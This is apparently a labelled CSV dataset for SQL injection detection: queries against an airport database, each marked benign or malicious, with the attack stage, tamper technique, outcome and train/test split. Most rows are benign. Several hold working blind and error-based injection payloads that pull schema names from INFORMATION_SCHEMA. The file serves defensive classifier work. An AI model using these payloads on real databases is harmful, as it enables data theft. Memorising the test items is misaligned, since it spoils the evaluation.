"UPDATE airport_frequencies SET description = ""ATIS"" WHErE 9744=9744 And 1796=(sElEcT (CaSE WHeN (ORd(mID((sElEcT IFNUlL(cAst(coLuMN_nAME As NcHAr),0x20) frOm INFORMATION_SCHEMA.CoLuMNS WHErE table_nAmE=0x616972706f7274 And table_schema=0x64617461736574 lImit 17,1),4,1))>106) tHeN 1796 elSe (sElEcT 3900 unioN sElEcT 3736) eND))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" WHErE 9744=9744 And 1796=(sElEcT (CaSE WHeN (ORd(mID((sElEcT IFNUlL(cAst(coLuMN_nAME As NcHAr),0x20) frOm INFORMATION_SCHEMA.CoLuMNS WHErE table_nAmE=0x616972706f7274 And table_schema=0x64617461736574 lImit 17,1),4,1))>106) tHeN 1796 elSe (sElEcT 3900 unioN sElEcT 3736) eND))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"UPDATE airport_frequencies SET frequency_mhz = 126.7 WHERE type = ""GND"";",0,126.7 GND,,,,update,airport-U6,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Aurora Municipal Al Potter Field"");",0,Aurora Municipal Al Potter Field,,,,select,airport-S12,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DZ"" GROUP BY r.name ORDER BY r.name ASC;",0,DZ,,,,select,airport-S5,,,test
"DELETE FROM airport WHERE ident=""JP-1924"" anD gTID_SUBSEt(cONCAt(0x716a7a7a71,(Select mID((IfnuLl(cAst(cOLUMN_nAME As NcHAR),0x20)),1,47) fRom INFORMATION_SCHEMA.coluMnS WHEre TAble_nAMe=0x72756e77617973 anD table_schema=0x64617461736574 lIMiT 4,1),0x7170716a71),9482) anD ""kWux""=""kWux"";",1," JP-1924"" anD gTID_SUBSEt(cONCAt(0x716a7a7a71,(Select mID((IfnuLl(cAst(cOLUMN_nAME As NcHAR),0x20)),1,47) fRom INFORMATION_SCHEMA.coluMnS WHEre TAble_nAMe=0x72756e77617973 anD table_schema=0x64617461736574 lIMiT 4,1),0x7170716a71),9482) anD ""kWux""=""kWux ",exploit,randomcase,success,delete,airport-D1,error-115,error,test
"DELETE FROM airport WHERE name = ""Duacari 2 Airport"";  ",0,Duacari 2 Airport,,,,delete,airport-D2,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Macanillal Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Macanillal Airport,,,,select,airport-S14,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Minnesota Mine"") OR name LIKE ""SVMY""",0,Minnesota Mine SVMY,,,,select,airport-S10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""KW"" OR c.name LIKE CONCAT(""%"", ""Marshall Islands"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,KW Marshall Islands 2,,,,select,airport-S20,,,test
SELECT * FROM airport WHERE icao_code = 'YTMO';,0,YTMO,,,,select,airport-S1,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-TX""",0,EU US-TX,,,,select,airport-S8,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""A B Dock Services"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""06SN"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Campo di Volo I Grifoni, Campo Volo Nogaredo, UDSVT"", ""%"");",0,"A B Dock Services 06SN Campo di Volo I Grifoni, Campo Volo Nogaredo, UDSVT",,,,select,airport-S17,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (14821, ""YARN"", 3937.0, ""DIRT"", 0, 0)",0,14821 YARN 3937.0 DIRT 0 0,,,,insert,airport-I9,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 3001.0 AND 3001.0",1, 3001.0 3001.0,recon,commentbeforeparentheses,failure,select,airport-S2,stacked-165,stacked,test
"SELECT id FROM airports WHERE type LIKE ""medium_airport"" AND elevation_feet >= 526.0 AND scheduled_service = ""no"" AND iso_country = ""US"" AND longitude <= 10.884167",0,medium_airport 526.0 no US 10.884167,,,,select,airport-S23,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""BR-MT""",0,AS BR-MT,,,,select,airport-S8,,,test
"DELETE FROM navaids WHERE ident = ""NBR"";",0,NBR,,,,delete,airport-D6,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""MX86"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""AM5"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Base ULM Corneilla de la Rivière"", ""%"");",0,MX86 AM5 Base ULM Corneilla de la Rivière,,,,select,airport-S17,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""WS-SA"", ""BU"", ""Manzini Region"", ""EU"", ""AF"")",0,WS-SA BU Manzini Region EU AF,,,,insert,airport-I5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Hawke's Bay Region"";",0,Hawke's Bay Region,,,,select,airport-S15,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Heston Aerodrome"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Heston Aerodrome,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""L89"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Banpo Xi Apartment"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""LGVO, LGVO"", ""%"");",0,"L89 Banpo Xi Apartment LGVO, LGVO",,,,select,airport-S17,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Anasol"") OR name LIKE ""Good Samsun Hospital""",0,Anasol Good Samsun Hospital,,,,select,airport-S10,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""AT"") OR a.elevation_ft > 6.0",0,AT 6.0,,,,select,airport-S11,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""BR""",0,BR,,,,select,airport-S6,,,test
"DELETE FROM runways WHERE airport_ident = ""90OR"";",0,90OR,,,,delete,airport-D5,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SDHP"";",0,SDHP,,,,select,airport-S7,,,test
"UPDATE navaids SET name = ""Evans"" WHERE ident = ""HR"";",0,Evans HR,,,,update,airport-U7,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-NE""",0,EU US-NE,,,,select,airport-S8,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Laidley Hospital Helipad"");",0,Laidley Hospital Helipad,,,,select,airport-S12,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1611.0 AND 866.0",0,1611.0 866.0,,,,select,airport-S2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Atizapán de Zaragoza;""",0,Atizapán de Zaragoza,,,,select,airport-S21,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""BR""",0,BR,,,,select,airport-S9,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 899.0 AND 740.0",0,899.0 740.0,,,,select,airport-S2,,,train
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""BR-MA""",0,EU BR-MA,,,,select,airport-S8,,,test
"UPDATE countries SET keywords = ""Airports in Solomon Islands"" WHERE code = ""ET"";",0,Airports in Solomon Islands ET,,,,update,airport-U8,,,test
"DELETE FROM regions WHERE name = ""-1262')))
ORDERBY	1---"";",1," -1262')))
ORDERBY	1--- ",recon,space2mysqlblank,failure,delete,airport-D8,union-152,union,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""ID-PB"", ""9"", ""Shiselweni Region"", ""EU"", ""LB"")",0,ID-PB 9 Shiselweni Region EU LB,,,,insert,airport-I5,,,test
"INSERT INTO countries (code, name, continent) VALUES (""NI""=""NI"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 11,1),4,1))>90,5010) AND ""NI""=""NI"", ""Niue"", ""AF"")",1," NI""=""NI"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 11,1),4,1))>90,5010) AND ""NI""=""NI Niue AF ",exploit,sleep2getlock,success,insert,airport-I7,boolean-36,boolean,test
"SELECT id FROM airports WHERE longitude <= 35.583 AND scheduled_service = ""no"" AND elevation_feet <= 92.0 AND name LIKE ""%qTld2sennRauDrDvxpWE%"" OR name LIKE ""%gTLtZwh7zU2BLYrSZyOS%"" AND latitude BETWEEN 59.448015 AND 26.15222 AND ( FIND_IN_SET(""NYg2bRqenHd0IC1lfyUi"", keywords_field) > 0) AND type LIKE ""closed""",0,35.583 no 92.0 qTld2sennRauDrDvxpWE gTLtZwh7zU2BLYrSZyOS 59.448015 26.15222 NYg2bRqenHd0IC1lfyUi closed,,,,select,airport-S23,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""ZZ"" GROUP BY r.name ORDER BY r.name ASC;",0,ZZ,,,,select,airport-S5,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Ekalaka_Airport"" WHERE ident = ""53NE""",0,https://en.wikipedia.org/wiki/Ekalaka_Airport 53NE,,,,update,airport-U3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GM"" GROUP BY r.name ORDER BY r.name ASC;",0,GM,,,,select,airport-S5,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VU"" GROUP BY r.name ORDER BY r.name ASC;",0,VU,,,,select,airport-S5,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""FI"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,FI 3,,,,select,airport-S19,,,test
"INSERT INTO countries (code, name, continent) VALUES (""DE"", ""Netherlands"", ""AF"")",0,DE Netherlands AF,,,,insert,airport-I7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LR"" GROUP BY r.name ORDER BY r.name ASC;",0,LR,,,,select,airport-S16,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Dhamar Governorate"";",0,Dhamar Governorate,,,,select,airport-S15,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Westlake Village;""",0,Westlake Village,,,,select,airport-S21,,,train
"INSERT INTO countries (code, name, continent, keywords) VALUES (""YT"", ""Senegal"", ""AS"", ""Airports in Marshall Islands"")",0,YT Senegal AS Airports in Marshall Islands,,,,insert,airport-I6,,,train
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""(unassigned)"";",0,(unassigned),,,,select,airport-S15,,,test
"DELETE FROM countries WHERE code = ""SV"";",0,SV,,,,delete,airport-D7,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-2920"",""small_airport"", ""Siller Bros Inc Airport"",""https://en.wikipedia.org/wiki/Harriet_Alexander_Field"",""SA"")",0,US-2920 small_airport Siller Bros Inc Airport https://en.wikipedia.org/wiki/Harriet_Alexander_Field SA,,,,insert,airport-I3,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""K36S"",""small_airport"", ""Maranatha Airport"",""https://en.wikipedia.org/wiki/San_Bernardo_Airport"",""SA"")",0,K36S small_airport Maranatha Airport https://en.wikipedia.org/wiki/San_Bernardo_Airport SA,,,,insert,airport-I3,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LR"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,LR 2,,,,select,airport-S19,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""HU-BA"", ""Astana City"", ""EU"", ""KW"", ""https://en.wikipedia.org/wiki/Santiago_de_Cuba_Province"", ""Airports in Potaro-Siparuni"") and 5042=5042 and (""xDuk"" like ""xDuk"")",1," HU-BA Astana City EU KW https://en.wikipedia.org/wiki/Santiago_de_Cuba_Province Airports in Potaro-Siparuni  and 5042=5042 and (""xDuk"" like ""xDuk ",recon,lowercase,success,insert,airport-I4,boolean-18,boolean,test
"UPDATE countries SET keywords = ""مطارات تونس"" WHERE code = ""QA"";",0,مطارات تونس QA,,,,update,airport-U8,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (16216, ""AR-0442"", 7555.0, ""ASPH-TURF"", 0, 0)",0,16216 AR-0442 7555.0 ASPH-TURF 0 0,,,,insert,airport-I9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Malhata, Be'er Sheva"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Rumphi District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Repülőterek Magyarország"", ""%"");",0,"Malhata, Be'er Sheva Airports in Rumphi District Repülőterek Magyarország",,,,select,airport-S18,,,test
"DELETE FROM airport WHERE name LIKE ""Spy Island Drill-Site Heliport"" OR keywords LIKE ""Formerly O70"";  ",0,Spy Island Drill-Site Heliport Formerly O70,,,,delete,airport-D3,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""SI-041"", ""F""))/**/AS/**/IvrP/**/WHERE/**/2677=2677/**/AND/**/GTID_SUBSET(CONCAT(0x7162767671,(SELECT/**/(ELT(7261=7261,1))),0x716a787871),7261)--/**/jHAA"", ""Lombardy"", ""AF"", ""JP"")",1," SI-041 F )/**/AS/**/IvrP/**/WHERE/**/2677=2677/**/AND/**/GTID_SUBSET(CONCAT(0x7162767671,(SELECT/**/(ELT(7261=7261,1))),0x716a787871),7261)--/**/jHAA Lombardy AF JP ",recon,space2comment,success,insert,airport-I5,error-25,error,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 2490=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 17,1),10,1))>96) then 2490 else (select 1478 union select 9363) end))-- -"");",1," Tarry Bank Airport"") and 2490=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 17,1),10,1))>96) then 2490 else (select 1478 union select 9363) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT id FROM airports WHERE longitude >= -118.070458 AND latitude <= 60.653396 AND municipality LIKE ""Pahrump""",0,-118.070458 60.653396 Pahrump,,,,select,airport-S23,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Primorsko Airfield"");",0,Primorsko Airfield,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""NU"" GROUP BY r.name ORDER BY r.name ASC;",0,NU,,,,select,airport-S16,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""AOA, AOA"") OR name LIKE ""Amanpulo""",0,"AOA, AOA Amanpulo",,,,select,airport-S10,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""NY46"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Plateaux Region"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Cypriot airports"", ""%"");",0,NY46 Airports in Plateaux Region Cypriot airports,,,,select,airport-S18,,,test
"INSERT INTO countries (code, name, continent) VALUES (""AQ"", ""Andorra"", ""AF""=""AF"" AND 8494=(SELECT (CASE WHEN (8494=1327) THEN 8494 ELSE (SELECT 1327 UNION SELECT 4670) END))-- -"")",1," AQ Andorra AF""=""AF"" AND 8494=(SELECT (CASE WHEN (8494=1327) THEN 8494 ELSE (SELECT 1327 UNION SELECT 4670) END))-- - ",recon,sleep2getlock,success,insert,airport-I7,boolean-36,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""RO"" GROUP BY r.name ORDER BY r.name ASC;",0,RO,,,,select,airport-S5,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 8.0 AND 888.0",0,8.0 888.0,,,,select,airport-S2,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (88661, ""PVQ"", ""Montelimar"", ""VOR-DME"", 285, ""FR"")",0,88661 PVQ Montelimar VOR-DME 285 FR,,,,insert,airport-I10,,,train
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Petrobrás Refinaria de Paulínea Replan Heliport""",0,Petrobrás Refinaria de Paulínea Replan Heliport,,,,select,airport-S3,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""EC-Y"", ""56"", ""Nablus Governorate))) AND 7490 LIKE (SELECT (CASE WHEN (7490 LIKE 9173) THEN 7490 ELSE (SELECT 9173 UNION SELECT 6450) END))-- -"", ""AF"", ""SY"")",1, EC-Y 56 Nablus Governorate))) AND 7490 LIKE (SELECT (CASE WHEN (7490 LIKE 9173) THEN 7490 ELSE (SELECT 9173 UNION SELECT 6450) END))-- - AF SY ,recon,equaltolike,success,insert,airport-I5,boolean-24,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VU"" GROUP BY r.name ORDER BY r.name ASC;",0,VU,,,,select,airport-S16,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"DELETE FROM regions WHERE name = ""Nui"";",0,Nui,,,,delete,airport-D8,,,train
"SELECT id FROM airports WHERE latitude BETWEEN -22.279057 AND 51.721699 AND longitude >= -46.544352 AND iso_region = ""US-CA"" AND scheduled_service = ""no"" AND name LIKE ""%XqLGIKl8VsxDs9LysIMI%"" AND type LIKE ""medium_airport""",0,-22.279057 51.721699 -46.544352 US-CA no XqLGIKl8VsxDs9LysIMI medium_airport,,,,select,airport-S23,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Tambuti_Airfield"" WHERE ident = ""ZA-0124""",0,https://en.wikipedia.org/wiki/Tambuti_Airfield ZA-0124,,,,update,airport-U3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Butte Valley Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Butte Valley Airport,,,,select,airport-S14,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Modena;""",0,Modena,,,,select,airport-S21,,,test
"UPDATE airport_frequencies SET description = ""GND"" WHERE airport_ident = ""ZA-0111"";",0,GND ZA-0111,,,,update,airport-U5,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""HU"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,HU 2,,,,select,airport-S19,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""US-3414"", ""-1015')) OR EXTRACTVALUE(8765,CASE WHEN (8765=8765) THEN 8765 ELSE 0x3A END) AND (('wxyu' LIKE 'wxyu"", ""Lewistown Hospital Heliport"", 34.286619, 152.340459824)",1," US-3414 -1015'   OR EXTRACTVALUE(8765,CASE WHEN (8765=8765  THEN 8765 ELSE 0x3A END  AND (('wxyu' LIKE 'wxyu Lewistown Hospital Heliport 34.286619 152.340459824 ",recon,sleep2getlock,failure,insert,airport-I1,boolean-0,boolean,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SDNC"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""KU7"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Pinangsori Airport"", ""%"");",0,SDNC KU7 Pinangsori Airport,,,,select,airport-S17,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""PA79"",""small_airport"", ""Fort McMurray / Mildred Lake Airport"",""https://en.wikipedia.org/wiki/Cascais_Aerodrome"",""SA"")",0,PA79 small_airport Fort McMurray / Mildred Lake Airport https://en.wikipedia.org/wiki/Cascais_Aerodrome SA,,,,insert,airport-I3,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Warroad_International_Memorial_Airport"" WHERE ident = ""JP-1486""",0,https://en.wikipedia.org/wiki/Warroad_International_Memorial_Airport JP-1486,,,,update,airport-U3,,,test
"SELECT id FROM airports WHERE latitude <= 37.521558 AND continent LIKE ""EU""",0,37.521558 EU,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 132.13 AND  133.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  128.45  AND  126.8  ORDER BY frequency;",0,132.13 133.5 128.45 126.8,,,,select,airport-S13,,,test
"DELETE FROM airport WHERE ident=""EBRO"";",0,EBRO,,,,delete,airport-D1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1710.0 AND 73.0",0,1710.0 73.0,,,,select,airport-S2,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""RU"", ""Uzbekistan"", ""AS"", ""مطارات سوريا"")",0,RU Uzbekistan AS مطارات سوريا,,,,insert,airport-I6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"DELETE FROM runways WHERE airport_ident = ""5TS8"";",0,5TS8,,,,delete,airport-D5,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PM"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,PM 5,,,,select,airport-S19,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Atyrau International Airport"");",0,Atyrau International Airport,,,,select,airport-S12,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""IL"", ""Lebanon"", ""AS"", ""Barbadan airports"")",0,IL Lebanon AS Barbadan airports,,,,insert,airport-I6,,,train
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""WW26)HAVING5591=7124--ODsa"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WW26)HAVING5591=7124--ODsa"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""WW26)HAVING5591=7124--ODsa"", ""%"");",1, WW26)HAVING5591=7124--ODsa WW26)HAVING5591=7124--ODsa WW26)HAVING5591=7124--ODsa ,recon,space2mysqlblank,failure,select,airport-S17,boolean-240,boolean,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""CG"", ""Burkina Faso"", ""EU"", ""Airports in Moldova"")",0,CG Burkina Faso EU Airports in Moldova,,,,insert,airport-I6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IN""",0,IN,,,,select,airport-S9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SWWK"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Milne Bay Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Bulgarian airports"", ""%"");",0,SWWK Airports in Milne Bay Province Bulgarian airports,,,,select,airport-S18,,,test
"SELECT id FROM airports WHERE iso_country LIKE ""MX"" AND name LIKE ""%zC82PEfh78AVtUK8W17p%"" AND elevation_feet <= 300.0 AND scheduled_service = ""no"" AND latitude BETWEEN 45.211399 AND -20.732200622558597 AND longitude <= -112.08000183105 AND type IN (""closed"",""closed"")",0,MX zC82PEfh78AVtUK8W17p 300.0 no 45.211399 -20.732200622558597 -112.08000183105 closed closed,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 119.275 AND  24.02  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  118.35  AND  118.3  ORDER BY frequency;",0,119.275 24.02 118.35 118.3,,,,select,airport-S13,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""BR""",0,BR,,,,select,airport-S6,,,test
